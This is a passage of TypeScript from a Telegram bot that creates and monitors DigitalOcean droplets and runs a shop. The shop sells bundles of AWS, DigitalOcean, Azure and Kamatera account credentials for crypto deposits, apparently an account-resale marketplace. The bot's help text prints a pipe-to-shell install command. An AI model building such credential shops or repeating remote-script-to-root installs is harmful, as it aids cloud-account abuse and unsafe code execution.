          const now = Math.floor(Date.now() / 1000);
          const start = now - 300;
          const cpuRes = await axios.get(`https://api.digitalocean.com/v2/monitoring/metrics/droplet/cpu`, {
            params: { host_id: tgUser.lastDropletId, start, end: now },
            headers: { 'Authorization': `Bearer ${tgUser.doApiKey}` }
          }).catch(() => null);

          // Fetch RAM Usage (last 5 minutes)
          const memRes = await axios.get(`https://api.digitalocean.com/v2/monitoring/metrics/droplet/memory_available`, {
            params: { host_id: tgUser.lastDropletId, start, end: now },
            headers: { 'Authorization': `Bearer ${tgUser.doApiKey}` }
          }).catch(() => null);

          const ipv4 = droplet.networks.v4.find((n: any) => n.type === 'public')?.ip_address || 'N/A';
          const ipv6 = droplet.networks.v6.find((n: any) => n.type === 'public')?.ip_address || 'N/A';

          let cpuUsage = 'N/A';
          if (cpuRes?.data?.data?.result) {
            const results = cpuRes.data.data.result;
            let totalUsage = 0;
            let count = 0;

            results.forEach((r: any) => {
              if (r.values && r.values.length > 0) {
                const latest = parseFloat(r.values[r.values.length - 1][1]);
                if (!isNaN(latest)) {
                  totalUsage += latest;
                  count++;
                }
              }
            });

            if (count > 0) {
              cpuUsage = `${(totalUsage * 100).toFixed(1)}%`;
            }
          }

          let memUsage = 'N/A';
          if (memRes?.data?.data?.result?.[0]?.values) {
            const values = memRes.data.data.result[0].values;
            const latestAvailable = parseFloat(values[values.length - 1][1]);
            memUsage = `${(latestAvailable / 1024 / 1024).toFixed(0)} MB Free`;
          }

          let text = `📊 *Droplet Monitoring*\n\n`;
          text += `🏷️ Name: \`${droplet.name}\`\n`;
          text += `🌐 IP IPv4: \`${ipv4}\`\n`;
          text += `🌐 IP IPv6: \`${ipv6}\`\n`;
          text += `📍 Region: \`${droplet.region.slug}\`\n`;
          text += `🔋 Status: \`${droplet.status}\`\n`;
          text += `⚡ Size: \`${droplet.size_slug}\`\n\n`;
          text += `📈 *Current Usage:*\n`;
          text += `🖥 CPU: \`${cpuUsage}\`\n`;
          text += `🧠 RAM: \`${memUsage}\`\n\n`;
          text += `💡 *How to enable monitoring?*\n`;
          text += `If it shows N/A, the DigitalOcean Agent is not installed or data hasn't arrived yet.\n\n`;
          text += `*Installation Command (Ubuntu/Debian):*\n`;
          text += `\`curl -sSL https://repos.insights.digitalocean.com/install.sh | sudo bash\`\n\n`;
          text += `Run this command inside your server to see real-time stats.`;

          const keyboard = {
            inline_keyboard: [
              [{ text: '🔄 Refresh', callback_data: 'do_monitor_droplet' }],
              [{ text: '🔙 Back', callback_data: 'do_menu' }]
            ]
          };

          await targetBot.editMessageText(text, {
            chat_id: chatId,
            message_id: query.message?.message_id,
            reply_markup: keyboard,
            parse_mode: 'Markdown'
          }).catch((err: any) => {
            if (!err.message.includes('message is not modified')) {
              throw err;
            }
          });
        } catch (err: any) {
          await targetBot.sendMessage(chatId, `❌ Failed to fetch info: ${err.response?.data?.message || err.message}`);
        }
        return;
      }

      if (data === 'do_region_select') {
        const keyboard = {
          inline_keyboard: [
            [{ text: '📀 Standard OS (Ubuntu, Debian...)', callback_data: 'do_type_os' }],
            [{ text: '🛒 Marketplace (WordPress, Docker...)', callback_data: 'do_type_marketplace' }],
            [{ text: '🔙 Back', callback_data: 'do_menu' }]
          ]
        };
        await targetBot.editMessageText('🚀 *Step 1: Choice Droplet Type*\n\nSelect the base image type for your droplet:', {
          chat_id: chatId,
          message_id: query.message?.message_id,
          reply_markup: keyboard,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (data?.startsWith('do_type_')) {
        const type = data.split('_')[2];
        await storage.updateTelegramUserByChatId(userId, { lastAction: `do_flow_type_${type}` });

        const keyboard = {
          inline_keyboard: [
            [{ text: 'New York 3', callback_data: 'do_reg_nyc3' }, { text: 'Singapore 1', callback_data: 'do_reg_sgp1' }],
            [{ text: 'London 1', callback_data: 'do_reg_lon1' }, { text: 'Frankfurt 1', callback_data: 'do_reg_fra1' }],
            [{ text: '🔙 Back', callback_data: 'do_region_select' }]
          ]
        };

        await targetBot.editMessageText('🌍 *Step 2: Choice Region*\n\nSelect a region for your droplet:', {
          chat_id: chatId,
          message_id: query.message?.message_id,
          reply_markup: keyboard,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (data?.startsWith('do_reg_')) {
        const region = data.split('_')[2];
        const lastAction = tgUser?.lastAction || '';
        const type = lastAction.split('_')[3];

        await storage.updateTelegramUserByChatId(userId, { lastAction: `${lastAction}_reg_${region}` });

        if (type === 'marketplace') {
          const apps = [
            { name: 'CyberPanel on Ubuntu', slug: 'cyberpanel-22-04' },
            { name: 'LAMP on Ubuntu', slug: 'lamp-20-04' },
            { name: 'WordPress on Ubuntu', slug: 'wordpress-22-04' },
            { name: 'Docker on Ubuntu', slug: 'docker-20-04' },
            { name: 'cPanel & WHM', slug: 'cpanel-110-ubuntu' },
            { name: 'OpenVPN Access Server', slug: 'openvpn-as' }
          ];
          const keyboard = {
            inline_keyboard: [
              ...apps.map(a => ([{ text: a.name, callback_data: `do_os_${a.slug}` }])),
              [{ text: '🔙 Back', callback_data: `do_type_marketplace` }]
            ]
          };
          await targetBot.editMessageText('🛒 *Step 3: Choice Marketplace App*\n\nSelect an application from Marketplace:', {
            chat_id: chatId,
            message_id: query.message?.message_id,
            reply_markup: keyboard,
            parse_mode: 'Markdown'
          });
        } else {
          const systems = [
            { name: 'Ubuntu', slug: 'ubuntu' },
            { name: 'Debian', slug: 'debian' },
            { name: 'CentOS', slug: 'centos' },
            { name: 'Fedora', slug: 'fedora' }
          ];
          const keyboard = {
            inline_keyboard: [
              ...systems.map(s => ([{ text: s.name, callback_data: `do_os_${s.slug}` }])),
              [{ text: '🔙 Back', callback_data: `do_type_os` }]
            ]
          };
          await targetBot.editMessageText('💿 *Step 3: Choice OS*\n\nSelect an operating system:', {
            chat_id: chatId,
            message_id: query.message?.message_id,
            reply_markup: keyboard,
            parse_mode: 'Markdown'
          });
        }
        return;
      }

      if (data?.startsWith('do_os_')) {
        const os = data.split('_')[2];
        const lastAction = tgUser?.lastAction || '';
        const region = lastAction.split('_')[5];
        const type = lastAction.split('_')[3];

        await storage.updateTelegramUserByChatId(userId, { lastAction: `${lastAction}_os_${os}` });

        if (type === 'marketplace') {
          const keyboard = {
            inline_keyboard: [
              [{ text: 'Shared CPU (Basic)', callback_data: 'do_cpu_basic' }],
              [{ text: 'Dedicated CPU (General)', callback_data: 'do_cpu_g' }],
              [{ text: '🔙 Back', callback_data: `do_reg_${region}` }]
            ]
          };
          await targetBot.editMessageText(`🌍 Region: ${region}\n🛒 App: ${os}\n\n💻 *Step 4: Choose CPU Type*\n\nSelect CPU architecture:`, {
            chat_id: chatId,
            message_id: query.message?.message_id,
            reply_markup: keyboard,
            parse_mode: 'Markdown'
          });
        } else {
          const versions: Record<string, any[]> = {
            'ubuntu': [{ text: '24.04 x64', callback_data: 'do_ver_ubuntu-24-04-x64' }, { text: '22.04 x64', callback_data: 'do_ver_ubuntu-22-04-x64' }],
            'debian': [{ text: '12 x64', callback_data: 'do_ver_debian-12-x64' }, { text: '11 x64', callback_data: 'do_ver_debian-11-x64' }],
            'centos': [{ text: 'Stream 9 x64', callback_data: 'do_ver_centos-stream-9-x64' }],
            'fedora': [{ text: '40 x64', callback_data: 'do_ver_fedora-40-x64' }]
          };

          const keyboard = {
            inline_keyboard: [
              ...(versions[os] || []).map(v => [v]),
              [{ text: '🔙 Back', callback_data: `do_reg_${region}` }]
            ]
          };
          await targetBot.editMessageText(`🌍 Region: ${region}\n📀 OS: ${os}\n\n🔢 *Step 4: Version*\n\nSelect a version:`, {
            chat_id: chatId,
            message_id: query.message?.message_id,
            reply_markup: keyboard,
            parse_mode: 'Markdown'
          });
        }
        return;
      }

      if (data?.startsWith('do_ver_')) {
        const version = data.split('_')[2];
        const lastAction = tgUser?.lastAction || '';
        const region = lastAction.split('_')[5];
        const os = lastAction.split('_')[7];
        await storage.updateTelegramUserByChatId(userId, { lastAction: `${lastAction}_ver_${version}` });

        const keyboard = {
          inline_keyboard: [
            [{ text: 'Shared CPU (Basic)', callback_data: 'do_cpu_basic' }],
            [{ text: 'Dedicated CPU (General)', callback_data: 'do_cpu_g' }],
            [{ text: '🔙 Back', callback_data: `do_os_${os}` }]
          ]
        };
        await targetBot.editMessageText(`🌍 Region: ${region}\n📀 OS: ${os} (${version})\n\n💻 *Step 5: Choose CPU Type*\n\nSelect CPU architecture:`, {
          chat_id: chatId,
          message_id: query.message?.message_id,
          reply_markup: keyboard,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (data?.startsWith('do_cpu_')) {
        const cpuType = data.split('_')[2];
        const lastAction = tgUser?.lastAction || '';
        const version = lastAction.split('_')[7];
        await storage.updateTelegramUserByChatId(userId, { lastAction: `${lastAction}_cpu_${cpuType}` });

        const basicSizes = [
          { text: '1 vCPU / 1GB RAM ($6/mo)', callback_data: 'do_size_s-1vcpu-1gb' },
          { text: '1 vCPU / 2GB RAM ($12/mo)', callback_data: 'do_size_s-1vcpu-2gb' },
          { text: '2 vCPU / 2GB RAM ($18/mo)', callback_data: 'do_size_s-2vcpu-2gb' }
        ];
        const dedicatedSizes = [
          { text: '2 vCPU / 8GB RAM ($63/mo)', callback_data: 'do_size_g-2vcpu-8gb' },
          { text: '4 vCPU / 16GB RAM ($126/mo)', callback_data: 'do_size_g-4vcpu-16gb' }
        ];

        const keyboard = {
          inline_keyboard: [
            ...(cpuType === 'basic' ? basicSizes : dedicatedSizes).map(s => [s]),
            [{ text: '🔙 Back', callback_data: `do_ver_${version}` }]
          ]
        };
        await targetBot.editMessageText(`🌍 Region: ${tgUser?.lastAction?.split('_')[3]}\n📀 OS: ${tgUser?.lastAction?.split('_')[5]}\n💻 CPU: ${cpuType}\n\n💰 *Step 6: Choice Size & Price*\n\nSelect droplet size:`, {
          chat_id: chatId,
          message_id: query.message?.message_id,
          reply_markup: keyboard,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (data?.startsWith('do_size_')) {
        const size = data.split('_')[2];
        const lastAction = tgUser?.lastAction || '';
        await storage.updateTelegramUserByChatId(userId, { lastAction: `${lastAction}_sz_${size}` });

        const keyboard = {
          inline_keyboard: [
            [{ text: '🔑 SSH Key', callback_data: 'do_auth_ssh' }, { text: '🔡 Password', callback_data: 'do_auth_pass' }],
            [{ text: '🔙 Back', callback_data: `do_cpu_${lastAction.split('_')[9]}` }]
          ]
        };
        await targetBot.editMessageText(`🌍 Region: ${lastAction.split('_')[3]}\n📀 OS: ${lastAction.split('_')[5]}\n💻 Size: ${size}\n\n🔐 *Step 7: Auth Method*\n\nHow do you want to access your droplet?`, {
          chat_id: chatId,
          message_id: query.message?.message_id,
          reply_markup: keyboard,
          parse_mode: 'Markdown'
        });
        return;
      }

      if (data === 'do_auth_pass') {
        await storage.updateTelegramUserByChatId(userId, { lastAction: (await storage.getTelegramUser(userId))?.lastAction + '_auth_pass_await' });
        await targetBot.sendMessage(chatId, "Please enter a secure password for your new droplet:");
        return;
      }

      if (data === 'do_auth_ssh') {
        await storage.updateTelegramUserByChatId(userId, { lastAction: (await storage.getTelegramUser(userId))?.lastAction + '_auth_ssh_await' });
        await targetBot.sendMessage(chatId, "Please send your public SSH key (starting with ssh-rsa, etc.):");
        return;
      }

      if (data === 'do_set_key') {
        await storage.updateTelegramUserByChatId(userId, { lastAction: 'awaiting_do_api_key' });
        await targetBot.sendMessage(chatId, "Please send your DigitalOcean Personal Access Token (API Key):");
        return;
      }

      if (data === 'do_create_droplet') {
        if (!tgUser.doApiKey) return;

        const lastAction = tgUser.lastAction || '';
        const size = lastAction.includes('_sz_') ? lastAction.split('_sz_')[1].split('_')[0] : 's-1vcpu-1gb';
        const region = lastAction.includes('_reg_') ? lastAction.split('_reg_')[1].split('_')[0] : 'nyc3';
        const os = lastAction.includes('_os_') ? lastAction.split('_os_')[1].split('_')[0] : 'ubuntu';
        const version = lastAction.includes('_ver_') ? lastAction.split('_ver_')[1].split('_')[0] : '24-04-x64';

        const cleanSize = size.replace(/[^a-zA-Z0-9-]/g, '');
        const cleanRegion = region.replace(/[^a-zA-Z0-9-]/g, '');
        const image = os.includes('-') ? os : `${os}-${version}`;

        const creationWaitMsg = await targetBot.sendMessage(chatId, "⏳ <b>Creating droplet... Please wait.</b>", { parse_mode: 'HTML' });

        try {
          const response = await axios.post('https://api.digitalocean.com/v2/droplets', {
            name: `cloudshop-${userId}-${Math.floor(Date.now() / 1000)}`,
            region: cleanRegion,
            size: cleanSize,
            image: image
          }, {
            headers: {
              'Authorization': `Bearer ${tgUser.doApiKey}`,
              'Content-Type': 'application/json'
            }
          });

          const droplet = response.data.droplet;
          await storage.updateTelegramUserByChatId(userId, { lastDropletId: droplet.id.toString() });

          await targetBot.sendMessage(chatId, `✅ Droplet created successfully!\n\nName: ${droplet.name}\nStatus: ${droplet.status}\n\nIt will be ready in a few minutes.`);
        } catch (err: any) {
          console.error('DO Create error:', err.response?.data || err.message);
          await targetBot.sendMessage(chatId, `❌ Failed to create droplet: ${err.response?.data?.message || err.message}`);
        } finally {
          if (creationWaitMsg) {
            await targetBot.deleteMessage(chatId, creationWaitMsg.message_id).catch(() => {});
          }
        }
        return;
      }

      if (data === 'profile_refresh') {
        const allOrders = await storage.getOrders();
        const userPurchases = allOrders.filter(o => o.telegramUserId === tgUser.id).length;
        const balanceUSD = (tgUser.balance / 100).toFixed(2);
        const regDate = tgUser.createdAt ? format(tgUser.createdAt, "yyyy-MM-dd HH:mm:ss") : "N/A";

        const automationSetting = await storage.getSetting("AUTOMATION_ENABLED");
        const isAutomationEnabled = automationSetting?.value === "true";

        const specialOffersSetting = await storage.getSetting("SPECIAL_OFFERS_ENABLED");
        const isSpecialOffersEnabled = specialOffersSetting?.value !== "false";

        let hasActiveOffers = false;
        try {
          const activeOffers = await storage.getActiveSpecialOffers();
          hasActiveOffers = activeOffers.length > 0;
        } catch (err) {
          console.error("Error fetching active offers for profile:", err);
        }

        const inline_keyboard = [
          [{ text: 'Add funds', callback_data: 'add_funds', icon_custom_emoji_id: '5201692367437974073' }, { text: 'Purchase history', callback_data: 'purchase_history', icon_custom_emoji_id: '5334882760735598374' }],
          isAutomationEnabled
            ? [{ text: '🤖 Automation', callback_data: 'automation_menu' }, { text: 'Tutorial', callback_data: 'tutorial_menu', icon_custom_emoji_id: '5226512880362332956' }]
            : [{ text: 'Tutorial', callback_data: 'tutorial_menu', icon_custom_emoji_id: '5226512880362332956' }]
        ];

        if (isSpecialOffersEnabled && hasActiveOffers) {
          inline_keyboard.push([{ text: 'Special Offers', callback_data: 'special_offers', icon_custom_emoji_id: '6276134137963222688' }]);
        }

        const keyboard = { inline_keyboard };

        if (query.message?.message_id) {
          await targetBot.editMessageText(`<tg-emoji emoji-id="5467538555158943525">💭</tg-emoji> <b>Your Profile</b> <tg-emoji emoji-id="5456343263340405032">🛍</tg-emoji>\n━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>ID:</b> ${tgUser.telegramId}\n\n<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji> <b>Balance:</b> ${balanceUSD}$\n\n<tg-emoji emoji-id="5348256365477382384">⭐️</tg-emoji> <b>Purchased pcs:</b> ${userPurchases} pcs\n\n<tg-emoji emoji-id="5805188079148863343">🕒</tg-emoji> <b>Registration:</b> ${regDate}`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: keyboard,
            parse_mode: 'HTML'
          });
        }
        return;
      }

      if (data.startsWith('approve_dep_')) {
        const parts = data.split('_');
        const targetUserId = parts[2];
        const amount = parseFloat(parts[3]);
        const targetUser = await storage.getTelegramUser(targetUserId);
        if (targetUser) {
          await storage.updateTelegramUser(Number(targetUserId), { balance: targetUser.balance + Math.round(amount * 100) });
          targetBot.sendMessage(targetUser.telegramId, `✅ Your deposit of $${amount.toFixed(2)} has been approved!`);
          targetBot.sendMessage(chatId, `✅ Approved deposit for ${targetUserId}`);
        }
        return;
      }

      if (data.startsWith('reject_dep_')) {
        const targetUserId = data.split('_')[2];
        const targetUser = await storage.getTelegramUser(targetUserId);
        if (targetUser) {
          targetBot.sendMessage(targetUser.telegramId, `❌ Your deposit has been rejected.`);
          targetBot.sendMessage(chatId, `❌ Rejected deposit for ${targetUserId}`);
        }
        return;
      }

      if (data.startsWith('cat_')) {
        const category = data.substring(4);
        const products = await storage.getProducts();
        const categoryProducts = products.filter(p => p.type === category && p.status === 'available');

        // Delete the "Select the product you need" message
        try {
          if (query.message) {
            await targetBot.deleteMessage(chatId, query.message.message_id);
          }
        } catch (err) { }

        if (categoryProducts.length === 0) {
          targetBot.sendMessage(chatId, `No products available in ${category}.`);
          return;
        }

        const keyboard = [];
        for (const p of categoryProducts) {
          const stock = await storage.getCredentialsByProduct(p.id);
          const availableStock = stock.filter(c => c.status === 'available').length;
          if (availableStock > 0) {
            keyboard.push([{
              text: `${p.name} - $${(p.price / 100).toFixed(2)} | ${availableStock} Pcs`,
              callback_data: `prod_${p.id}`
            }]);
          }
        }

        if (keyboard.length === 0) {
          targetBot.sendMessage(chatId, `Sorry, all products in ${category} are currently out of stock.`);
          return;
        }

        let catIcon = '';
        const catLower = category.toLowerCase();
        if (catLower.includes('aws')) catIcon = '<tg-emoji emoji-id="5785025630055700143">☁️</tg-emoji> ';
        else if (catLower.includes('digital ocean') || catLower.includes('digitalocean')) catIcon = '<tg-emoji emoji-id="6235413342576450502">💧</tg-emoji> ';
        else if (catLower.includes('azure')) catIcon = '<tg-emoji emoji-id="6235420094265037090">☁️</tg-emoji> ';
        else if (catLower.includes('kamatera')) catIcon = '<tg-emoji emoji-id="6235239937566838722">☁️</tg-emoji> ';

        targetBot.sendMessage(chatId, `${catIcon} <b>${category}</b>\n\nSelect the product you need <tg-emoji emoji-id="5231102735817918643">🛍</tg-emoji>`, {
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: keyboard }
        });
        return;
      }

      if (data.startsWith('copy_userid_')) {
        const userIdToCopy = data.substring(12);
        await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> <b>User ID sent!</b> You can now long-press to copy it. <tg-emoji emoji-id="5231102735817918643">📋</tg-emoji>`, { parse_mode: 'HTML' });
        targetBot.sendMessage(chatId, `<code>${userIdToCopy}</code>`, { parse_mode: 'HTML' });
        return;
      }

      if (data.startsWith('copy_payid_')) {
        const payIdToCopy = data.substring(11);
        await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> <b>Pay ID sent!</b> You can now long-press to copy it. <tg-emoji emoji-id="5231102735817918643">📋</tg-emoji>`, { parse_mode: 'HTML' });
        targetBot.sendMessage(chatId, `<code>${payIdToCopy}</code>`, { parse_mode: 'HTML' });
        return;
      }

      if (data.startsWith('copy_wallet_')) {
        let walletToCopy = data.substring(12);
        if (walletToCopy === 'trc20') {
          walletToCopy = (await storage.getSetting('TRC20_WALLET_ADDRESS'))?.value || "Not Set";
        } else if (walletToCopy === 'aptos') {
          walletToCopy = (await storage.getSetting('APTOS_WALLET_ADDRESS'))?.value || "Not Set";
        }
        await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> <b>Wallet Address sent!</b> You can now long-press to copy it. <tg-emoji emoji-id="5231102735817918643">📋</tg-emoji>`, { parse_mode: 'HTML' });
        targetBot.sendMessage(chatId, `<code>${walletToCopy}</code>`, { parse_mode: 'HTML' });
        return;
      }

      if (data.startsWith('copy_amount_')) {
        const amountToCopy = data.substring(12);
        await targetBot.sendMessage(chatId, `<tg-emoji emoji-id="6276090299232031662">🆔</tg-emoji> <b>Deposit Amount sent!</b> You can now long-press to copy it. <tg-emoji emoji-id="5231102735817918643">📋</tg-emoji>`, { parse_mode: 'HTML' });
        targetBot.sendMessage(chatId, `<code>${amountToCopy}</code>`, { parse_mode: 'HTML' });
        return;
      }

      if (data.startsWith('prod_')) {
        const productId = parseInt(data.substring(5));
        const product = await storage.getProduct(productId);
        if (!product) {
          await targetBot.sendMessage(chatId, "Product not found.");
          return;
        }

        // Delete the "Products in Category" message
        try {
          if (query.message) {
            await targetBot.deleteMessage(chatId, query.message.message_id);
          }
        } catch (err) { }

        const stock = await storage.getCredentialsByProduct(product.id);
        const availableStock = stock.filter(c => c.status === 'available').length;

        if (availableStock === 0) {
          await targetBot.sendMessage(chatId, "❌ Sorry, this product is out of stock.");
          return;
        }

        const prompt = await targetBot.sendMessage(chatId, `How many ${product.name} would you like to buy? (Max: ${availableStock})`);
        await storage.updateTelegramUser(parseInt(tgUser.id.toString()), {
          lastAction: `awaiting_quantity_${productId}`,
          lastMessageId: prompt?.message_id
        });
        return;
      }

      if (data.startsWith('confirm_offer_')) {
        const chatIdStr = chatId.toString();
        if (confirmingOffers.has(chatIdStr)) return;
        confirmingOffers.add(chatIdStr);

        const offerId = parseInt(data.substring(14));
        const offer = await storage.getSpecialOffer(offerId);
        if (!offer) {
          confirmingOffers.delete(chatIdStr);
          await targetBot.sendMessage(chatId, "❌ Offer not found.");
          return;
        }

        const product = await storage.getProduct(offer.productId);
        if (!product) {
          confirmingOffers.delete(chatIdStr);
          return;
        }

        try {
          const result = await db.transaction(async (tx) => {
            // 1. Stock check and selection inside transaction
            const availableCredentials = await tx.select()
              .from(credentials)
              .where(and(eq(credentials.productId, product.id), eq(credentials.status, 'available')))
              .limit(offer.bundleQuantity || 1)
              .for('update', { skipLocked: true });

            if (availableCredentials.length < (offer.bundleQuantity || 1)) {
              throw new Error(`Not enough stock. (Required: ${offer.bundleQuantity || 1}, Available: ${availableCredentials.length})`);
            }

            // 2. Double check and Deduct balance atomically
            const [updatedUser] = await tx
              .update(telegramUsers)
              .set({
                balance: sql`${telegramUsers.balance} - ${offer.price}`
              })
              .where(and(eq(telegramUsers.id, tgUser.id), gte(telegramUsers.balance, offer.price)))
              .returning();

            if (!updatedUser) {
              throw new Error("Insufficient balance");
            }

            // 3. Mark credentials as sold and create orders
            for (const cred of availableCredentials) {
              await tx.update(credentials)
                .set({ status: 'sold' })
                .where(eq(credentials.id, cred.id));

              await tx.insert(orders).values({
                telegramUserId: tgUser.id,
                productId: product.id,
                credentialId: cred.id,
                status: 'completed'
              });
            }

            return { updatedUser, availableCredentials };
          });

          // 4. Success Response
          let successMsg = `<tg-emoji emoji-id="6276090299232031662">✅</tg-emoji> <b>Purchase Successful!</b> <tg-emoji emoji-id="5456343263340405032">🛍️</tg-emoji>\n\n` +
            `<tg-emoji emoji-id="5231102735817918643">🎁</tg-emoji> Product: <b>${offer.name}</b>\n` +
            `📦 Quantity: <b>${offer.bundleQuantity || 1} pcs</b>\n` +
            `<tg-emoji emoji-id="5201692367437974073">💵</tg-emoji> Price: <b>$${(offer.price / 100).toFixed(2)}</b>\n\n` +
            `<tg-emoji emoji-id="6276134137963222688">🔑</tg-emoji> <b>Your Credentials:</b>\n`;

          result.availableCredentials.forEach((c, index) => {
            const num = (index + 1).toString().padStart(2, '0');
            successMsg += `<b>Account ${num}:</b> <code>${c.content}</code>\n`;
          });

          successMsg += `\nThank you for shopping with us! <tg-emoji emoji-id="5456343263340405032">🛍️</tg-emoji>`;

          confirmingOffers.delete(chatIdStr);

          await targetBot.editMessageText(successMsg, {
            chat_id: chatId,
            message_id: query.message?.message_id,
            parse_mode: 'HTML'
          });

          // Emit real-time notification to Admin Dashboard
          const userDisplayName = tgUser.firstName || tgUser.username || "User";
          io.emit('admin_notification', {
            type: 'purchase',
            title: 'New Bundle Purchase (Telegram Bot)',
            message: `${userDisplayName} claimed bundle: ${offer.name} ($${(offer.price / 100).toFixed(2)})`,
            data: {
              offer,
              availableCredentials: result.availableCredentials,
              tgUser
            }
          });

          // Emit Native Push Notification
          sendAdminPushNotification(
            'New Bundle Purchase (Telegram Bot)',
            `${userDisplayName} claimed bundle: ${offer.name} ($${(offer.price / 100).toFixed(2)})`
          ).catch(console.error);

        } catch (err: any) {
          console.error('Special offer purchase error:', err);
          const errorText = err.message === "Insufficient balance"
            ? "❌ Insufficient balance to complete this purchase."
            : `❌ Purchase failed: ${err.message}`;

          await targetBot.sendMessage(chatId, errorText);
          confirmingOffers.delete(chatIdStr);
        }
        return;
      }

      if (data === 'cancel_purchase') {
        await storage.updateTelegramUser(tgUser.id, { lastAction: null });
        confirmingOffers.delete(chatId.toString());
        await targetBot.editMessageText("❌ Purchase cancelled.", {
          chat_id: chatId,
          message_id: query.message?.message_id
        });

        // Auto-delete after 5 seconds
        const msgIdToDelete = query.message?.message_id;
        if (msgIdToDelete) {
          setTimeout(async () => {
            try {
              await targetBot.deleteMessage(chatId, msgIdToDelete);
            } catch (err) { }
          }, 5000);
        }
        return;
      }

      if (data === 'purchase_history') {
        const allOrders = await storage.getOrders();
        const userIdNum = tgUser.id;
        const userOrders = allOrders.filter(o => o.telegramUserId === userIdNum);

        if (userOrders.length === 0) {
          await targetBot.sendMessage(chatId, '📜 You haven\'t purchased anything yet.');
          return;
        }

        const keyboard = {
          inline_keyboard: [
            [{ text: '🛍 Last 10 Purchases', callback_data: 'history_last10' }],
            [{ text: '📜 Show All History', callback_data: 'history_all' }],
            [{ text: '🔙 Back', callback_data: 'profile_refresh' }]
          ]
        };

        const menuText = `<tg-emoji emoji-id="5334982154868783692">📊</tg-emoji> <tg-emoji emoji-id="6276090299232031662">📜</tg-emoji> <b>Purchase History Menu</b>\n\nPlease select an option below: <tg-emoji emoji-id="5231102735817918643">🎁</tg-emoji>`;

        await targetBot.sendMessage(chatId, menuText, {
          parse_mode: 'HTML',
          reply_markup: keyboard
        });
        return;
      }

      if (data === 'history_last10' || data === 'history_all') {
        const allOrders = await storage.getOrders();
        const userIdNum = tgUser.id;
        const userOrders = allOrders
          .filter(o => o.telegramUserId === userIdNum)
          .sort((a, b) => a.id - b.id);

        const displayOrders = data === 'history_last10'
          ? userOrders.slice(-10)
          : userOrders;

        for (let i = 0; i < displayOrders.length; i += 10) {
          const batch = displayOrders.slice(i, i + 10);
          let historyText = i === 0
            ? `<tg-emoji emoji-id="5334982154868783692">📜</tg-emoji> <b>Your Purchase History</b> (${data === 'history_last10' ? 'Last 10' : 'All'}):\n\n`
            : '';

          batch.forEach((order, index) => {
            const safeName = escapeHTML(order.product?.name || 'Unknown');
            const safeContent = escapeHTML(order.credential?.content || 'N/A');
            historyText += `<b>${i + index + 1}.</b> <tg-emoji emoji-id="6276134137963222688">🛍</tg-emoji> <b>${safeName}</b>\n<tg-emoji emoji-id="5201692367437974073">💰</tg-emoji> $${((order.product?.price || 0) / 100).toFixed(2)}\n<tg-emoji emoji-id="6276090299232031662">🔑</tg-emoji> <code>${safeContent}</code>\n\n`;
          });

          await targetBot.sendMessage(chatId, historyText, { parse_mode: 'HTML' });
        }
        return;
      }

      if (data === 'special_offers') {
        const stopSpecialOfferTimer = (chatIdVal: number) => {
          if (activeSpecialOfferTimers.has(chatIdVal)) {
            clearInterval(activeSpecialOfferTimers.get(chatIdVal)!);
            activeSpecialOfferTimers.delete(chatIdVal);
          }
        };

        const sendOrEditOffers = async (chatIdVal: number, messageId?: number) => {
          if (confirmingOffers.has(chatIdVal.toString())) return; // Safety lock
          let offers = [];
          try {
            offers = await storage.getActiveSpecialOffers();
          } catch (err) {
            console.error("Error in special_offers handler:", err);
          }
          if (offers.length === 0) {
            stopSpecialOfferTimer(chatIdVal);
            const emptyMsg = "😔 No special offers available right now.";
            if (messageId) {
              try {
                return await targetBot.editMessageText(emptyMsg, { chat_id: chatIdVal, message_id: messageId });
              } catch (e) { }
            } else {
              try {
                return await targetBot.sendMessage(chatIdVal, emptyMsg);
              } catch (e) { }
            }
            return;
          }

          const headerEmojiIds = [
            "6276128687649723695", "6275964744453068322", "6275873218699989657",
            "6275869662467069270", "6276120956708591159", "6276075885321786491",
            "6276045545672807753", "6273727139506295416", "6276107406086771779"
          ];

          const header = headerEmojiIds.map(id => `<tg-emoji emoji-id="${id}">🎁</tg-emoji>`).join('');

          const numEmojiMap: Record<string, string> = {
            "0": "6228712321716325542", "1": "6231028576104221771", "2": "6228508985079632140",
            "3": "6228892912206220866", "4": "6228651427670002796", "5": "6230754058974531742",
            "6": "6231061110481488717", "7": "6228541351953173776", "8": "6228898272325406140",
            "9": "6230968699965150268"
          };

          let text = `<tg-emoji emoji-id="5467538555158943525">💭</tg-emoji> <b>Special Offers (Bundle Deals)</b> <tg-emoji emoji-id="5456343263340405032">🛍</tg-emoji>\n━━━━━━━━━━━━━━━\n\n`;
          text += `${header}\n\n`;

          const keyboard = { inline_keyboard: [] as any[] };

          for (const offer of offers) {
            const priceUSD = (offer.price / 100).toFixed(2);
            const titleEmoji = offer.customEmojiId ? `<tg-emoji emoji-id="${offer.customEmojiId}">🎁</tg-emoji>` : `<tg-emoji emoji-id="6276134137963222688">🎁</tg-emoji>`;
            text += `${titleEmoji} <b>${offer.name}</b>\n`;
            text += `💰 Price: <b>$${priceUSD} USD</b>\n`;
            text += `📦 Quantity: <b>${offer.bundleQuantity} pcs</b>\n`;

            if (offer.expiresAt) {
              const diff = new Date(offer.expiresAt).getTime() - Date.now();
              if (diff > 0) {
                const totalSeconds = Math.floor(diff / 1000);
                const h = Math.floor(totalSeconds / 3600).toString().padStart(2, '0');
                const m = Math.floor((totalSeconds % 3600) / 60).toString().padStart(2, '0');
                const s = (totalSeconds % 60).toString().padStart(2, '0');

                text += `<tg-emoji emoji-id="5206715082582533386">🤩</tg-emoji> <b>Hurry! Expires In</b> <tg-emoji emoji-id="5206715082582533386">🤩</tg-emoji>\n`;
                const formatTimeDigit = (digit: string | undefined) => {
                  const d = digit || '0';
                  return `<tg-emoji emoji-id="${numEmojiMap[d] || numEmojiMap['0']}">🎁</tg-emoji>`;
                };

